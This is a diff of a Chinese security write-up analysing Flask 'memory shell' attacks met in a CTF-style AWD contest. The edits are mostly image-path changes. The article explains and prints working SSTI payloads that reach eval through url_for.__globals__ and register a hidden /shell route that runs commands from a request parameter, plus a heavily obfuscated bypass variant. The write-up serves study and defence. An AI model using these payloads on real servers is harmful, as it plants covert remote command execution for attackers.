@@ -1,7 +1,8 @@
 # Python 内存马
+
 Author: H3rmesk1t
 
-Data: 2022.02.09
+本文首发于[先知社区](https://xz.aliyun.com/t/10933)
 
 ## 前言
 打安洵杯线下的时候有一道`Python`的`SSTI`模板注入的`AWD`题目, 由于之前没有怎么接触过关于`Python`的攻防点, 一度被别人种了`Python 内存马`都还没发现, 等比赛中断发现修补后的题目被打进来后, 查看流量记录才意识到攻击者前面是用的`Flask`内存马打的, 之前看过大概的思路却鸽了一直没学, 这里暂且记录一下相关知识点.
@@ -42,9 +43,9 @@ url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell',
 
 命令执行结果:
 
-![](./Python%20Flask%20内存马/1.png)
+![](./images/1.png)
 
-![](./Python%20Flask%20内存马/1.png)
+![](./images/1.png)
 
 ## Payload 分析
 将前面的`Payload`拆开来, 逐层分析.
@@ -65,13 +66,13 @@ url_for.__globals__['__builtins__']['eval'](
 
 对于`url_for.__globals__['__builtins__']['eval']`这一截`Payload`, `url_for`是`Flask`的一个内置函数, 通过`Flask`内置函数可以调用其`__globals__`属性, 该特殊属性能够返回函数所在模块命名空间的所有变量, 其中包含了很多已经引入的`modules`, 可以看到这里是支持`__builtins__`的.
 
-![](./Python%20Flask%20内存马/3.png)
+![](./images/3.png)
 
-![](./Python%20Flask%20内存马/4.png)
+![](./images/4.png)
 
 在`__builtins__`模块中, `Python`在启动时就直接为我们导入了很多内建函数. 准确的说, `Python`在启动时会首先加载内建名称空间, 内建名称空间中有许多名字到对象之间的映射, 这些名字就是内建函数的名称, 对象就是这些内建函数对象. 可以看到, 在`__builtins__`模块的内建函数中是存在`eval`、`exec`等命令执行函数的.
 
-![](./Python%20Flask%20内存马/5.png)
+![](./images/5.png)
 
 ```python
 ['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
@@ -83,13 +84,13 @@ url_for.__globals__['__builtins__']['eval'](
 {{url_for.__globals__['__builtins__']['eval']("__import__('os').system('open -a Calculator')")}}
 ```
 
-![](./Python%20Flask%20内存马/6.png)
+![](./images/6.png)
 
 接着再来看看`app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())`这一截`Payload`. 这部分是动态添加了一条路由, 而处理该路由的函数是个由`lambda`关键字定义的匿名函数.
 
 在`Flask`中注册路由的时候是添加的`@app.route()`装饰器来实现的, 跟进查看其源码实现, 发现其调用了`add_url_rule`函数来添加路由.
 
-![](./Python%20Flask%20内存马/7.png)
+![](./images/7.png)
 
 跟进`add_url_rule`函数, 其参数说明如下:
  - rule: 函数对应的`URL`规则, 满足条件和`app.route`的第一个参数一样, 必须以`/`开头.
@@ -98,7 +99,7 @@ url_for.__globals__['__builtins__']['eval'](
  - provide_automatic_options: 控制是否应自动添加选项方法.
  - options: 要转发到基础规则对象的选项.
 
-![](./Python%20Flask%20内存马/8.png)
+![](./images/8.png)
 
 `lambda`即匿名函数, `Payload`中`add_url_rule`函数的第三个参数定义了一个`lambda`匿名函数, 其中通过`os`库的`popen`函数执行从`Web`请求中获取的`cmd`参数值并返回结果, 其中该参数值默认为`whoami`.
 
@@ -137,7 +138,7 @@ request.application.__self__._get_data_for_json.__getattribute__('__globa'+'ls__
 get_flashed_messages|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fgetitem\x5f\x5f")("__builtins__")|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fgetitem\x5f\x5f")("\u0065\u0076\u0061\u006c")("app.add_ur"+"l_rule('/h3rmesk1t', 'h3rmesk1t', la"+"mbda :__imp"+"ort__('o"+"s').po"+"pen(_request_c"+"tx_stack.to"+"p.re"+"quest.args.get('shell')).re"+"ad())",{'\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b':get_flashed_messages|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fgetitem\x5f\x5f")("\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b"),'app':get_flashed_messages|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fgetitem\x5f\x5f")("\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070")})
 ```
 
-![](./Python%20Flask%20内存马/10.png)
+![](./images/10.png)
 
 ## 参考
  - [浅析Python Flask内存马](https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/)
